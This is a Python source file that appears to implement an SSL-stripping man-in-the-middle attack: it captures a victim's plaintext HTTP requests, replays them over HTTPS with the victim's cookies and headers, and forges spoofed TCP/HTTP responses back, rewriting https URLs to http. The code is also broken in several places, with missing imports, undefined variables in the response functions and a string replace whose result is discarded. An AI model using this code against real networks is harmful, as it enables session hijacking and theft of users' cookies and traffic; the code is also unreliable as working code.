import packet_sniffer
import requests

from enum import Enum
class HttpRequestType(Enum):
    GET = 1
    POST = 2

    
def check_packet(pkt, args):
    if pkt.haslayer(HTTPRequest):
        print("[+] Stripping HTTP request {}".format(pkt.summary()))

        response = ssl_request(pkt)

        response_pkt = http_response(response, pkt)

        return response_pkt

    return pkt


def ssl_request(http_request):
    (method, url, payload, headers, cookies) = parse_http_request(http_request)

    r = None
    if method == HttpRequestType.GET:
        r = requests.get(url, params=payload, headers=headers, cookies=cookies)
    elif method == HttpRequestType.POST:
        r = requests.post(url, json=payload, headers=headers, cookies=cookies)
    else:
        print("Unknown method: {}".format(method))

    return r

def parse_http_request(pkt):
    if not pkt.haslayer(HTTPRequest):
        return None
    
    http_request = pkt[HTTPRequest]

    method = None
    if http_request.Method == b"GET":
        method = HttpRequestType.GET
    elif http_request.Method == b"POST":
        method = HttpRequestType.POST

    url = "https://" + http_request.Host.decode("utf-8") + http_request.Path.decode("utf-8")

    payload = None
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load

    headers = { "Accept_Encoding": http_request.Accept_Encoding,
                "Accept_Language": http_request.Accept_Language,
                "Accept": http_request.Accept,  
                "Connection": http_request.Connection,
                "Content_Type": http_request.Content_Type,
                "Host": http_request.Host,
                "User_Agent": http_request.User_Agent}

    raw_cookies = http_request.Cookie
    cookie = SimpleCookie()
    if raw_cookies is not None:
        cookie.load(raw_cookies)

    cookies = {k: v.value for k, v in cookie.items()}

    return (method, url, payload, headers, cookies)

def http_response(ssl_response, http_request):
    (url, content, headers, cookies) = parse_ssl_response(ssl_response)
    
    pkt =   Ether(src = http_request[Ether].dst, dst = http_request[Ether].dst)/\
            IP(src = http_request[IP].dst, dst = http_request[IP].src)/\
            TCP(sport = http_request[TCP].dport, dport = http_request[TCP].sport, seq = http_request[TCP].ack, ack = http_request[TCP].seq + len(http_request[TCP]))/\
            HTTP()/\
            HTTPResponse(Server = url, Set_Cookie = cookies)/\
            content

    return pkt

def parse_ssl_response(response):
    url = response.url
    if url.startswith('https://'):
        url.replace('https://', 'http://')
    
    cookie_string = "; ".join([str(x)+"="+str(y) for x,y in response.cookieitems()])
    
    pkt =   Ether(src = http_request[Ether].dst, dst = http_request[Ether].dst)/\
            IP(src = http_request[IP].dst, dst = http_request[IP].src)/\
            TCP(sport = http_request[TCP].dport, dport = http_request[TCP].sport, seq = http_request[TCP].ack, ack = http_request[TCP].seq + len(http_request[TCP]))/\
            HTTP()/\
            HTTPResponse(Server = url, Set_Cookie = cookie_string)/\
            content
    
    return (url, r.content.decode("utf-8"), r.headers, cookie_string)